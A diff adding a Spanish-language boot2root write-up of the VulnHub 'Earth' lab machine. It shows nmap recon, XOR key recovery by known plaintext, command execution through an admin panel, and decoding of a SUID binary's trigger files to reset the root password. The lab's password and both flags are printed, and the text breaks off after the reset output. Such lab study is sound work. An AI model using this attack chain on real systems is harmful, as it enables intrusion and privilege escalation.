@@ -1,0 +1,626 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="author" content="W4lterSec">
+<meta name="description" content="Earth de VulnHub completada hasta root. Writeup de W4lterSec: vhosts, XOR, ejecución autenticada e ingeniería inversa de un binario SUID.">
+<title>Earth · VulnHub · W4lterSec</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600&display=swap">
+<style>
+/* Layout: single dark "mission terminal" column over a live aurora+particle field — 21st.dev/Magic-UI effect layer (gradient text, border beam, meteors, spotlight). Committed dark neon-CRT identity. */
+:root{
+  --bg:#0a0e0d; --bg2:#0f1513; --panel:#111917; --panel2:#0c1210;
+  --line:#1e2b27; --line2:#2a3d37;
+  --fg:#d6e4de; --muted:#7d938b; --dim:#52655e;
+  --green:#39ff9e; --green-d:#1fb973; --cyan:#4fd6ff; --amber:#ffcf5c;
+  --red:#ff6b6b; --violet:#b98cff;
+  --flag:#39ff9e;
+  --mono:'JetBrains Mono',ui-monospace,SFMono-Regular,Menlo,monospace;
+  --disp:'Space Grotesk',system-ui,sans-serif;
+  --body:'Inter',system-ui,sans-serif;
+  --maxw:860px;
+  color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{
+  background:var(--bg);
+  color:var(--fg); font-family:var(--body); line-height:1.6;
+  -webkit-font-smoothing:antialiased; letter-spacing:.1px; position:relative;
+}
+/* ---- 21st.dev: Aurora background (animated blurred blobs) ---- */
+.aurora{position:fixed; inset:-20% -10% auto -10%; height:130vh; z-index:0; pointer-events:none; overflow:hidden; filter:blur(60px); opacity:.6}
+.aurora span{position:absolute; border-radius:50%; mix-blend-mode:screen; will-change:transform}
+.aurora .a1{width:46vw; height:46vw; left:-6vw; top:-8vh; background:radial-gradient(circle,#0e7a52,transparent 65%); animation:drift1 22s ease-in-out infinite}
+.aurora .a2{width:38vw; height:38vw; right:-4vw; top:2vh; background:radial-gradient(circle,#0c5e7a,transparent 65%); animation:drift2 27s ease-in-out infinite}
+.aurora .a3{width:34vw; height:34vw; left:30vw; top:20vh; background:radial-gradient(circle,#2b5a1f,transparent 65%); animation:drift3 31s ease-in-out infinite}
+@keyframes drift1{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(10vw,8vh) scale(1.15)}}
+@keyframes drift2{0%,100%{transform:translate(0,0) scale(1.05)}50%{transform:translate(-8vw,10vh) scale(.9)}}
+@keyframes drift3{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(-6vw,-6vh) scale(1.2)}}
+/* ---- animated grid pattern ---- */
+.grid-bg{position:fixed; inset:0; z-index:0; pointer-events:none; opacity:.4;
+  background-image:linear-gradient(rgba(57,255,158,.05) 1px,transparent 1px),linear-gradient(90deg,rgba(57,255,158,.05) 1px,transparent 1px);
+  background-size:46px 46px; mask-image:radial-gradient(ellipse 80% 50% at 50% 0,#000 40%,transparent 80%)}
+/* ---- particles canvas ---- */
+#px{position:fixed; inset:0; z-index:0; pointer-events:none; opacity:.55}
+/* scanline veil on top of everything */
+body::after{content:""; position:fixed; inset:0; pointer-events:none; z-index:60; opacity:.3;
+  background:repeating-linear-gradient(0deg, rgba(0,0,0,.14) 0 1px, transparent 1px 3px); mix-blend-mode:multiply}
+
+.wrap{max-width:var(--maxw); margin:0 auto; position:relative; z-index:2;
+  padding-left:max(18px,env(safe-area-inset-left,0px));
+  padding-right:max(18px,env(safe-area-inset-right,0px));}
+
+/* status bar */
+.status{position:sticky; top:env(safe-area-inset-top,0px); z-index:40;
+  background:rgba(10,14,13,.78); backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--line);}
+body::before{content:""; position:fixed; inset:0 0 auto; height:env(safe-area-inset-top,0px); z-index:41; background:#0a0e0d;}
+.status .wrap{display:flex; align-items:center; gap:14px; padding-block:11px; font-family:var(--mono); font-size:12.5px;}
+.dot{width:9px; height:9px; border-radius:50%; background:var(--green); box-shadow:0 0 10px var(--green); flex:none; animation:pulse 2.4s ease-in-out infinite;}
+@keyframes pulse{0%,100%{opacity:1} 50%{opacity:.35}}
+.status b{color:var(--green); font-weight:700; letter-spacing:.5px}
+.status .sp{color:var(--dim)}
+.status .right{margin-left:auto; color:var(--muted); display:flex; gap:12px}
+.status .right span{white-space:nowrap}
+@media(max-width:560px){ .status .right span.hide{display:none} }
+
+/* hero */
+.hero{padding-block:46px 30px; position:relative}
+/* ---- 21st.dev: spotlight follows cursor ---- */
+.spotlight{position:absolute; inset:-40px; z-index:0; pointer-events:none; opacity:0; transition:opacity .4s;
+  background:radial-gradient(360px circle at var(--mx,50%) var(--my,30%), rgba(57,255,158,.1), transparent 60%)}
+.hero:hover .spotlight{opacity:1}
+.hero>*{position:relative; z-index:1}
+.tag{font-family:var(--mono); font-size:12px; letter-spacing:3px; text-transform:uppercase; color:var(--green-d); margin:0 0 14px}
+/* ---- 21st.dev: animated gradient text (shimmer) ---- */
+h1{font-family:var(--disp); font-weight:700; font-size:clamp(44px,13vw,96px); line-height:.92;
+  margin:0; letter-spacing:-2px; text-wrap:balance;
+  background:linear-gradient(100deg,#eafff5,#39ff9e,#4fd6ff,#39ff9e,#eafff5);
+  background-size:220% auto; -webkit-background-clip:text; background-clip:text; color:transparent;
+  animation:shimmer 6s linear infinite; filter:drop-shadow(0 0 40px rgba(57,255,158,.18))}
+@keyframes shimmer{to{background-position:220% center}}
+/* ---- 21st.dev: glitch title layers ---- */
+.glitch{position:relative}
+.glitch::before,.glitch::after{content:attr(data-text); position:absolute; inset:0; background:none;
+  -webkit-text-fill-color:currentColor; pointer-events:none; opacity:0}
+.glitch::before{color:var(--cyan)} .glitch::after{color:var(--red)}
+html.anim .glitch.go::before{animation:gl1 4.6s infinite steps(1)}
+html.anim .glitch.go::after{animation:gl2 4.6s infinite steps(1)}
+@keyframes gl1{0%,92%,100%{opacity:0;transform:none;clip-path:inset(0)}93%{opacity:.85;transform:translate(-3px,-1px);clip-path:inset(12% 0 60% 0)}95%{opacity:.85;transform:translate(2px,1px);clip-path:inset(68% 0 8% 0)}97%{opacity:.7;transform:translate(-2px,0);clip-path:inset(40% 0 42% 0)}}
+@keyframes gl2{0%,92%,100%{opacity:0;transform:none;clip-path:inset(0)}93%{opacity:.75;transform:translate(3px,1px);clip-path:inset(20% 0 55% 0)}95%{opacity:.75;transform:translate(-2px,-1px);clip-path:inset(62% 0 12% 0)}97%{opacity:.6;transform:translate(2px,0);clip-path:inset(48% 0 35% 0)}}
+/* ---- 21st.dev: ShimmerButton ---- */
+.shimmer{position:relative; margin-top:14px; display:inline-flex; align-items:center; gap:7px;
+  font-family:var(--mono); font-size:11.5px; letter-spacing:.5px; color:#042014; font-weight:700;
+  background:var(--green); border:none; border-radius:7px; padding:7px 13px; cursor:pointer; overflow:hidden; z-index:2}
+.shimmer::before{content:""; position:absolute; inset:0; z-index:-1;
+  background:linear-gradient(110deg,transparent 25%,rgba(255,255,255,.7) 50%,transparent 75%);
+  background-size:200% 100%; animation:shbtn 2.6s linear infinite}
+@keyframes shbtn{to{background-position:-200% 0}}
+.shimmer:active{transform:translateY(1px)} .shimmer.done{background:var(--cyan)}
+.sub{color:var(--muted); font-size:16px; max-width:60ch; margin:18px 0 0}
+.meta{display:flex; flex-wrap:wrap; gap:9px; margin-top:24px}
+.chip{font-family:var(--mono); font-size:12px; padding:6px 11px; border:1px solid var(--line2);
+  border-radius:7px; color:var(--fg); background:rgba(12,18,16,.7); display:flex; gap:7px; align-items:center}
+.chip i{font-style:normal; color:var(--muted)}
+.chip.mint{border-color:rgba(57,255,158,.4); color:var(--green)}
+.chip.rose{border-color:rgba(255,107,107,.4); color:var(--red)}
+
+/* ---- 21st.dev: Border Beam (rotating conic edge) ---- */
+.beam{position:relative; border-radius:12px; isolation:isolate}
+.beam::before{content:""; position:absolute; inset:0; padding:1px; border-radius:inherit; z-index:3; pointer-events:none;
+  background:conic-gradient(from var(--ba,0deg), transparent 0 72%, var(--green) 82%, var(--cyan) 90%, transparent 100%);
+  -webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);
+  -webkit-mask-composite:xor; mask-composite:exclude;
+  animation:beam 5s linear infinite}
+@property --ba{syntax:'<angle>'; inherits:false; initial-value:0deg}
+@keyframes beam{to{--ba:360deg}}
+
+/* hero terminal */
+.term{margin-top:30px; overflow:hidden;
+  background:linear-gradient(180deg,rgba(12,18,16,.92),rgba(10,15,13,.92)); box-shadow:0 24px 60px -30px rgba(0,0,0,.9), inset 0 1px 0 rgba(255,255,255,.03); border:1px solid var(--line2)}
+.term-bar{display:flex; align-items:center; gap:8px; padding:10px 14px; border-bottom:1px solid var(--line); background:#0e1513}
+.term-bar i{width:11px; height:11px; border-radius:50%; display:inline-block}
+.b1{background:#ff5f57}.b2{background:#febc2e}.b3{background:#28c840}
+.term-bar span{margin-left:8px; font-family:var(--mono); font-size:11.5px; color:var(--dim)}
+.term-body{padding:16px 16px 18px; font-family:var(--mono); font-size:13px; line-height:1.75; overflow-x:auto; min-height:238px}
+.ln{white-space:pre; display:block}
+.pr{color:var(--green)} .pth{color:var(--cyan)} .cm{color:var(--dim)}
+.ok{color:var(--green)} .wn{color:var(--amber)} .er{color:var(--red)}
+.cursor{display:inline-block; width:8px; height:15px; background:var(--green); margin-left:2px;
+  vertical-align:-2px; animation:blink 1.1s steps(1) infinite}
+@keyframes blink{50%{opacity:0}}
+
+/* ---- 21st.dev: Meteors ---- */
+.meteors{position:absolute; inset:0; overflow:hidden; pointer-events:none; z-index:0}
+.meteor{position:absolute; top:-10%; width:2px; height:2px; border-radius:50%; background:var(--green); box-shadow:0 0 0 1px rgba(57,255,158,.1);
+  animation:meteor linear infinite}
+.meteor::after{content:""; position:absolute; top:50%; transform:translateY(-50%); width:70px; height:1px;
+  background:linear-gradient(90deg,var(--green),transparent)}
+@keyframes meteor{0%{transform:translate(0,0) rotate(215deg); opacity:1}70%{opacity:1}100%{transform:translate(-360px,560px) rotate(215deg); opacity:0}}
+
+/* sections */
+section{padding-block:30px; border-top:1px solid var(--line)}
+.eyebrow{font-family:var(--mono); font-size:12px; letter-spacing:2px; text-transform:uppercase; color:var(--green-d); display:flex; align-items:center; gap:12px; margin:0 0 6px}
+.eyebrow .num{color:var(--bg); background:var(--green); font-weight:700; border-radius:5px; padding:1px 8px; letter-spacing:1px; box-shadow:0 0 16px rgba(57,255,158,.4)}
+h2{font-family:var(--disp); font-weight:600; font-size:clamp(25px,6vw,36px); margin:6px 0 0; letter-spacing:-.6px; text-wrap:balance}
+.lead{color:var(--muted); margin:12px 0 0; max-width:66ch}
+p{margin:14px 0 0; max-width:70ch}
+p.mt0{margin-top:0}
+strong{color:#eafff5; font-weight:600}
+a{color:var(--cyan); text-decoration:none; border-bottom:1px solid rgba(79,214,255,.3)}
+code.k{font-family:var(--mono); font-size:.88em; background:var(--panel); border:1px solid var(--line2);
+  padding:1.5px 6px; border-radius:5px; color:var(--green); white-space:nowrap}
+mark{background:rgba(57,255,158,.16); color:#eafff5; padding:0 3px; border-radius:3px}
+
+/* code block */
+.code{margin-top:18px; border:1px solid var(--line2); border-radius:10px; overflow:hidden; background:rgba(12,18,16,.72); backdrop-filter:blur(4px)}
+.code-h{display:flex; align-items:center; gap:10px; padding:8px 13px; border-bottom:1px solid var(--line); background:rgba(13,20,17,.8); font-family:var(--mono); font-size:11.5px; color:var(--muted)}
+.code-h .tk{color:var(--green-d); letter-spacing:1px; text-transform:uppercase}
+.code-h .cp{margin-left:auto; color:var(--dim); border:1px solid var(--line2); border-radius:5px; padding:2px 8px; cursor:pointer; background:transparent; font-family:var(--mono); font-size:11px; transition:.15s}
+.code-h .cp:hover{color:var(--green); border-color:var(--green-d)}
+pre{margin:0; padding:14px 15px; overflow-x:auto; font-family:var(--mono); font-size:12.5px; line-height:1.7}
+pre code{white-space:pre}
+.c-cm{color:var(--dim)} .c-pr{color:var(--green)} .c-fl{color:var(--cyan)} .c-st{color:var(--amber)} .c-kw{color:var(--violet)} .c-out{color:var(--muted)}
+
+/* callout */
+.note{margin-top:18px; border-left:3px solid var(--green-d); background:linear-gradient(90deg,rgba(57,255,158,.06),transparent); padding:13px 16px; border-radius:0 8px 8px 0}
+.note.warn{border-color:var(--amber); background:linear-gradient(90deg,rgba(255,207,92,.07),transparent)}
+.note.crit{border-color:var(--red); background:linear-gradient(90deg,rgba(255,107,107,.07),transparent)}
+.note b{display:block; font-family:var(--mono); font-size:11.5px; letter-spacing:1px; text-transform:uppercase; margin-bottom:5px}
+.note.warn b{color:var(--amber)} .note.crit b{color:var(--red)} .note b{color:var(--green)}
+.note p{margin:0; max-width:none; color:var(--fg); font-size:14.5px}
+
+/* kill chain diagram */
+.chain{display:flex; flex-direction:column; gap:0; margin-top:22px}
+.hop{display:flex; gap:15px; align-items:flex-start; position:relative; padding-bottom:22px}
+.hop:last-child{padding-bottom:0}
+.hop .rail{display:flex; flex-direction:column; align-items:center; flex:none}
+.hop .node{width:34px; height:34px; border-radius:9px; border:1px solid var(--line2); background:var(--panel);
+  display:grid; place-items:center; font-family:var(--mono); font-weight:700; font-size:13px; color:var(--green); flex:none; z-index:2}
+.hop .node.root{background:var(--green); color:var(--bg); box-shadow:0 0 22px rgba(57,255,158,.5)}
+.hop .wire{width:2px; flex:1; background:linear-gradient(var(--green-d),var(--line2)); margin:2px 0; min-height:14px}
+.hop:last-child .wire{display:none}
+.hop .txt{padding-top:5px}
+.hop .txt h4{margin:0; font-family:var(--disp); font-size:16px; font-weight:600}
+.hop .txt p{margin:3px 0 0; font-size:13.5px; color:var(--muted); max-width:58ch}
+.hop .txt .as{font-family:var(--mono); font-size:11px; color:var(--green-d)}
+
+/* flags */
+.vault{display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-top:22px}
+@media(max-width:560px){.vault{grid-template-columns:1fr}}
+.flag{padding:17px; background:linear-gradient(180deg,rgba(17,25,23,.9),rgba(12,18,16,.9)); position:relative; overflow:hidden; border:1px solid var(--line2)}
+.flag .lab{font-family:var(--mono); font-size:11.5px; letter-spacing:1.5px; text-transform:uppercase; color:var(--muted)}
+.flag .val{font-family:var(--mono); font-size:13px; word-break:break-all; color:var(--flag); margin-top:9px; position:relative; text-shadow:0 0 18px rgba(57,255,158,.25)}
+.flag .who{font-family:var(--mono); font-size:11px; color:var(--dim); margin-top:10px}
+
+/* table */
+.tbl{margin-top:18px; border:1px solid var(--line2); border-radius:10px; overflow:hidden; background:rgba(12,18,16,.6)}
+.tbl .tw{overflow-x:auto}
+table{border-collapse:collapse; width:100%; font-size:13px; min-width:460px}
+th,td{text-align:left; padding:10px 13px; border-bottom:1px solid var(--line)}
+th{font-family:var(--mono); font-size:11px; letter-spacing:1px; text-transform:uppercase; color:var(--muted); background:rgba(13,20,17,.8)}
+tr:last-child td{border-bottom:none}
+td.m{font-family:var(--mono); font-size:12px}
+.sev{font-family:var(--mono); font-size:11px; padding:2px 8px; border-radius:20px; border:1px solid}
+.sev.hi{color:var(--red); border-color:rgba(255,107,107,.4); background:rgba(255,107,107,.08)}
+.sev.me{color:var(--amber); border-color:rgba(255,207,92,.4); background:rgba(255,207,92,.08)}
+.sev.lo{color:var(--cyan); border-color:rgba(79,214,255,.3); background:rgba(79,214,255,.07)}
+
+/* footer */
+footer{border-top:1px solid var(--line); padding-block:30px 46px; color:var(--dim); font-family:var(--mono); font-size:12px}
+footer .big{color:var(--green); font-size:14px; letter-spacing:1px}
+
+/* reveal */
+.r{opacity:1; transform:none}
+html.anim .r{opacity:0; transform:translateY(16px); transition:opacity .6s ease, transform .6s cubic-bezier(.2,.7,.2,1)}
+html.anim .r.in{opacity:1; transform:none}
+@media(prefers-reduced-motion:reduce){
+  html.anim .r{opacity:1!important; transform:none!important; transition:none!important}
+  .dot,.cursor,.aurora span,h1,.beam::before,.meteor,.glitch::before,.glitch::after,.shimmer::before{animation:none!important}
+  body::after,.meteors,#px,.glitch::before,.glitch::after{display:none!important}
+  h1{background-position:0 center}
+}
+
+body{margin:0}
+.portfolio-nav{display:flex;flex-wrap:wrap;align-items:center;gap:10px 18px;margin-bottom:28px;font-family:var(--mono);font-size:12px}
+.portfolio-nav a,.machine-links a{color:var(--cyan);text-decoration:none}
+.portfolio-nav a:hover,.machine-links a:hover{text-decoration:underline}
+.portfolio-nav span{color:var(--muted)}
+.machine-links{margin:28px 0 0;border:1px solid var(--line2);padding:18px;font-family:var(--mono);font-size:13px;scroll-margin-top:70px}
+.machine-links p{margin:0}
+.machine-links p+p{margin-top:10px;color:var(--muted);font-size:12px}
+</style>
+</head>
+<body>
+
+<div class="aurora" aria-hidden="true"><span class="a1"></span><span class="a2"></span><span class="a3"></span></div>
+<div class="grid-bg" aria-hidden="true"></div>
+<canvas id="px" aria-hidden="true"></canvas>
+
+<div class="status">
+  <div class="wrap">
+    <span class="dot"></span><b>ROOTED</b>
+    <span class="sp">//</span><span style="color:var(--muted)">earth.local</span>
+    <span class="right">
+      <span>192.168.1.22</span>
+      <span class="hide sp">·</span>
+      <span class="hide">Linux · Fedora</span>
+    </span>
+  </div>
+</div>
+
+<div class="wrap">
+
+  <header class="hero">
+    <nav class="portfolio-nav" aria-label="Navegación del portfolio">
+      <a href="https://github.com/W4lterSec/cybersecurity-labs/tree/main/red-team">← Red Team</a>
+      <span>W4lterSec · VulnHub · Fácil</span>
+      <a href="https://www.vulnhub.com/entry/the-planets_earth,755/" target="_blank" rel="noopener noreferrer">Máquina oficial ↗</a>
+    </nav>
+    <div class="spotlight" aria-hidden="true"></div>
+    <p class="tag r">Boot2Root · Walkthrough</p>
+    <h1 class="r glitch" data-text="EARTH">EARTH</h1>
+    <p class="sub r">De un certificado TLS filtrado a <strong>root</strong>: enumeración de vhosts, ruptura de un cifrado XOR por texto plano conocido, RCE autenticada en un panel Django y una escalada por ingeniería inversa de un binario SUID con triggers ofuscados.</p>
+    <div class="meta r">
+      <span class="chip mint"><i>os</i> Linux · Fedora 34</span>
+      <span class="chip"><i>web</i> Apache 2.4.51 · mod_wsgi</span>
+      <span class="chip"><i>stack</i> Django · Python 3.9</span>
+      <span class="chip rose"><i>privesc</i> SUID reset_root</span>
+    </div>
+
+    <div class="term beam r" aria-hidden="true">
+      <div class="meteors" id="met"></div>
+      <div class="term-bar"><i class="b1"></i><i class="b2"></i><i class="b3"></i><span>operator@kali: ~/earth</span></div>
+      <div class="term-body" id="type"></div>
+    </div>
+  </header>
+
+  <section>
+    <p class="eyebrow r"><span class="num">00</span> Resumen</p>
+    <h2 class="r">La cadena, de un vistazo</h2>
+    <p class="lead r">Cinco saltos desde la red hasta <code class="k">uid=0</code>. Cada eslabón habilita el siguiente: un dato filtrado da la metodología, la metodología rompe la cripto, la cripto abre el panel, el panel da shell y el binario SUID entrega la máquina.</p>
+
+    <div class="chain">
+      <div class="hop r">
+        <div class="rail"><div class="node">1</div><div class="wire"></div></div>
+        <div class="txt"><h4>Recon &amp; vhosts</h4><p>El certificado TLS del 443 revela <code class="k">earth.local</code> y <code class="k">terratest.earth.local</code>. Apache responde 400 sin el <i>Host</i> correcto.</p><span class="as">nmap · openssl</span></div>
+      </div>
+      <div class="hop r">
+        <div class="rail"><div class="node">2</div><div class="wire"></div></div>
+        <div class="txt"><h4>Fuga de información</h4><p><code class="k">testingnotes.txt</code> delata el algoritmo (XOR), el usuario admin <strong>terra</strong> y que <code class="k">testdata.txt</code> es el plaintext de prueba.</p><span class="as">robots.txt → testing vhost</span></div>
+      </div>
+      <div class="hop r">
+        <div class="rail"><div class="node">3</div><div class="wire"></div></div>
+        <div class="txt"><h4>Criptoanálisis XOR</h4><p>Texto plano conocido ⊕ texto cifrado = clave <strong>earthclimatechangebad4humans</strong>, reutilizada como contraseña del panel.</p><span class="as">known-plaintext attack</span></div>
+      </div>
+      <div class="hop r">
+        <div class="rail"><div class="node">4</div><div class="wire"></div></div>
+        <div class="txt"><h4>RCE → user</h4><p>El "Admin Command Tool" ejecuta comandos como <code class="k">apache</code>. <strong>User flag</strong> capturada.</p><span class="as">authenticated command exec</span></div>
+      </div>
+      <div class="hop r">
+        <div class="rail"><div class="node root">5</div></div>
+        <div class="txt"><h4>SUID reset_root → root</h4><p>Ingeniería inversa del cifrado interno para recuperar los 3 ficheros trigger. <strong>Root flag</strong>.</p><span class="as">binary RE · off-by-one</span></div>
+      </div>
+    </div>
+
+    <div class="vault">
+      <div class="flag beam r">
+        <div class="lab">User flag</div>
+        <div class="val">user_flag_3353b67d6437f07ba7d34afd7d2fc27d</div>
+        <div class="who">/var/earth_web/user_flag.txt · uid=48(apache)</div>
+        <button class="shimmer" type="button">⧉ copy flag</button>
+      </div>
+      <div class="flag beam r">
+        <div class="lab">Root flag</div>
+        <div class="val">root_flag_b0da9554d29db2117b02aa8b66ec492e</div>
+        <div class="who">/root/root_flag.txt · uid=0(root)</div>
+        <button class="shimmer" type="button">⧉ copy flag</button>
+      </div>
+    </div>
+    <div class="machine-links" id="maquina-oficial">
+      <p><a href="https://www.vulnhub.com/entry/the-planets_earth,755/" target="_blank" rel="noopener noreferrer">🌍 Abrir The Planets: Earth en VulnHub ↗</a></p>
+      <p>Máquina de SirFlash · Dificultad oficial: Fácil · Writeup de W4lterSec</p>
+    </div>
+  </section>
+
+  <section>
+    <p class="eyebrow r"><span class="num">01</span> Reconocimiento</p>
+    <h2 class="r">Tres puertos y un certificado hablador</h2>
+    <p class="lead r">Barrido TCP completo. La superficie es mínima — SSH y un Apache con doble HTTP/HTTPS — pero el certificado del 443 regala los nombres de host virtuales, sin los cuales Apache solo contesta <code class="k">400 Bad Request</code>.</p>
+    <div class="code r">
+      <div class="code-h"><span class="tk">bash</span><span>nmap -sVC</span><button class="cp">copy</button></div>
+      <pre><code><span class="c-pr">$</span> nmap -sS -p- --min-rate 2500 192.168.1.22
+<span class="c-out">22/tcp   open  ssh      OpenSSH 8.6 (protocol 2.0)
+80/tcp   open  http     Apache httpd 2.4.51 ((Fedora) mod_wsgi/4.7.1 Python/3.9)
+443/tcp  open  ssl/http Apache httpd 2.4.51 ((Fedora) ... )</span>
+
+<span class="c-pr">$</span> nmap -sVC -p443 192.168.1.22 <span class="c-fl">| grep -i -A2 ssl-cert</span>
+<span class="c-out">| ssl-cert: Subject: commonName=</span><span class="c-st">earth.local</span><span class="c-out">/stateOrProvinceName=Space</span>
+<span class="c-out">| Subject Alternative Name: DNS:</span><span class="c-st">earth.local</span><span class="c-out">, DNS:</span><span class="c-st">terratest.earth.local</span></code></pre>
+    </div>
+    <div class="note r"><b>Loot</b><p>Dos vhosts para resolver: <code class="k">earth.local</code> (app) y <code class="k">terratest.earth.local</code> (entorno de pruebas). Añádelos a <code class="k">/etc/hosts</code> o usa <code class="k">curl --resolve</code>.</p></div>
+  </section>
+
+  <section>
+    <p class="eyebrow r"><span class="num">02</span> Enumeración web</p>
+    <h2 class="r">El vhost de pruebas lo cuenta todo</h2>
+    <p class="lead r">El <code class="k">robots.txt</code> de <code class="k">terratest</code> desautoriza <code class="k">/testingnotes.*</code> — una señal de neón apuntando al fichero. Dentro, las notas de desarrollo filtran el diseño criptográfico completo.</p>
+    <div class="code r">
+      <div class="code-h"><span class="tk">http</span><span>terratest.earth.local/testingnotes.txt</span><button class="cp">copy</button></div>
+      <pre><code><span class="c-cm">Testing secure messaging system notes:</span>
+*Using <span class="c-st">XOR encryption</span> as the algorithm, should be safe as used in RSA.
+*<span class="c-st">testdata.txt</span> was used to test encryption.
+*<span class="c-st">terra</span> used as username for admin portal.
+Todo:
+*Need to test different key lengths to protect against bruteforce.</code></pre>
+    </div>
+    <p class="r">Tres regalos en cuatro líneas: el algoritmo es <strong>XOR</strong>, existe un <strong>plaintext conocido</strong> (<code class="k">testdata.txt</code>, un párrafo sobre la formación de la Tierra), y el usuario del panel es <strong>terra</strong>. La propia nota admite que la clave es corta y reutilizada — exactamente el escenario que rompe XOR.</p>
+  </section>
+
+  <section>
+    <p class="eyebrow r"><span class="num">03</span> Criptoanálisis</p>
+    <h2 class="r">Known-plaintext: XOR se desmorona</h2>
+    <p class="lead r">La portada de <code class="k">earth.local</code> lista los "Previous Messages" en hex. El mensaje más largo es el cifrado de <code class="k">testdata.txt</code>. Como <code class="k">C = P ⊕ K</code>, entonces <code class="k">K = C ⊕ P</code>: XOR-eando cifrado contra plaintext conocido cae la clave repetida.</p>
+    <div class="code r">
+      <div class="code-h"><span class="tk">python3</span><span>recover_key.py</span><button class="cp">copy</button></div>
+      <pre><code><span class="c-kw">import</span> binascii
+ct = binascii.unhexlify(open(<span class="c-st">"msg3.hex"</span>).read().strip())
+pt = <span class="c-st">b"According to radiometric dating estimation and other evidence, Earth formed..."</span>
+key = <span class="c-kw">bytes</span>(c ^ p <span class="c-kw">for</span> c, p <span class="c-kw">in</span> <span class="c-kw">zip</span>(ct, pt))
+<span class="c-kw">print</span>(key[:40])
+<span class="c-out">#  b'earthclimatechangebad4humansearthclimate'</span></code></pre>
+    </div>
+    <div class="note r"><b>Clave recuperada</b><p>La clave repetida es <mark>earthclimatechangebad4humans</mark>. Y como advertían las notas, está <strong>reutilizada</strong>: es también la contraseña del portal admin de <code class="k">terra</code>.</p></div>
+  </section>
+
+  <section>
+    <p class="eyebrow r"><span class="num">04</span> Acceso &amp; RCE</p>
+    <h2 class="r">Login Django, luego ejecución de comandos</h2>
+    <p class="lead r">El panel vive en <code class="k">/admin/login</code> (Django, con protección CSRF: hay que capturar el <code class="k">csrftoken</code> y enviar <i>Referer</i>). Autenticado como <code class="k">terra</code>, aparece un "Admin Command Tool" que ejecuta comandos del sistema sin sandbox.</p>
+    <div class="code r">
+      <div class="code-h"><span class="tk">bash</span><span>authenticated command exec</span><button class="cp">copy</button></div>
+      <pre><code><span class="c-cm"># login (CSRF) → cli_command=id</span>
+<span class="c-pr">terra@admin$</span> id
+<span class="c-out">uid=48(apache) gid=48(apache) groups=48(apache)</span>
+
+<span class="c-pr">terra@admin$</span> cat /var/earth_web/user_flag.txt
+<span class="c-st">[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]</span></code></pre>
+    </div>
+    <div class="note warn r"><b>Shell como apache</b><p>Ejecución de comandos arbitrarios como <code class="k">uid=48(apache)</code>. Suficiente para la user flag y para empezar a enumerar la escalada local.</p></div>
+  </section>
+
+  <section>
+    <p class="eyebrow r"><span class="num">05</span> Escalada de privilegios</p>
+    <h2 class="r">Desmontando el SUID reset_root</h2>
+    <p class="lead r">Entre los binarios SUID aparece <code class="k">/usr/bin/reset_root</code>: resetea la contraseña de root a <code class="k">Earth</code>… pero solo si existen tres "ficheros trigger". Ejecutado en seco, falla. Las rutas están ofuscadas dentro del binario, así que lo exfiltro y lo desensamblo.</p>
+
+    <div class="code r">
+      <div class="code-h"><span class="tk">bash</span><span>reset_root (sin triggers)</span><button class="cp">copy</button></div>
+      <pre><code><span class="c-pr">apache$</span> /usr/bin/reset_root
+<span class="c-out">CHECKING IF RESET TRIGGERS PRESENT...</span>
+<span class="c-er">RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.</span></code></pre>
+    </div>
+
+    <p class="r">Sin <code class="k">ltrace</code> en el objetivo, saco el binario por base64 y lo abro con <code class="k">objdump</code>. <code class="k">main</code> construye cada ruta en una función <code class="k">magic_cipher</code> antes de cada <code class="k">access()</code>. Reimplementada, es un XOR Vigenère de dos pasos:</p>
+
+    <div class="code r">
+      <div class="code-h"><span class="tk">python3</span><span>decode_triggers.py</span><button class="cp">copy</button></div>
+      <pre><code><span class="c-kw">def</span> mc(inb, key, count, keylen):
+    <span class="c-kw">return</span> <span class="c-kw">bytes</span>(inb[i] ^ key[i % (keylen-<span class="c-st">1</span>)] <span class="c-kw">for</span> i <span class="c-kw">in</span> <span class="c-kw">range</span>(count))
+
+<span class="c-cm"># paso 1: deriva la sub-clave con "palebluedot"</span>
+midkey = mc(cipher0, <span class="c-st">b"palebluedot"</span>, <span class="c-st">0x11</span>, <span class="c-st">0xc</span>)   <span class="c-out"># -> b"thebluemarble1972"</span>
+
+<span class="c-cm"># paso 2: descifra las 3 rutas con la sub-clave</span>
+t1 = mc(cipher1, midkey, <span class="c-st">0x11</span>, <span class="c-st">0x12</span>)   <span class="c-out"># /dev/shm/kHgTFI5G</span>
+t2 = mc(cipher2, midkey, <span class="c-st">0x11</span>, <span class="c-st">0x12</span>)   <span class="c-out"># /dev/shm/Zw7bV9U5</span>
+t3 = mc(cipher3, midkey, <span class="c-st">0x0d</span>, <span class="c-st">0x12</span>)   <span class="c-out"># /tmp/kcM0Wewe   &lt;- 13 bytes!</span></code></pre>
+    </div>
+
+    <div class="note crit r"><b>Trampa — off-by-one</b><p>El <code class="k">count</code> de la 3ª llamada es <code class="k">0x0d = 13</code>, no 12. El tercer trigger es <mark>/tmp/kcM0Wewe</mark> (con la <strong>e</strong> final), no <code class="k">/tmp/kcM0Wew</code>. Crear la ruta de 12 caracteres hace que <code class="k">reset_root</code> siga fallando — exactamente lo que pasó en el primer intento.</p></div>
+
+    <div class="code r">
+      <div class="code-h"><span class="tk">bash</span><span>trigger → reset → root</span><button class="cp">copy</button></div>
+      <pre><code><span class="c-pr">apache$</span> touch /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe
+<span class="c-pr">apache$</span> /usr/bin/reset_root
+<span class="c-out">CHECKING IF RESET TRIGGERS PRESENT...</span>
+<span class="c-st">RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth</span>
+
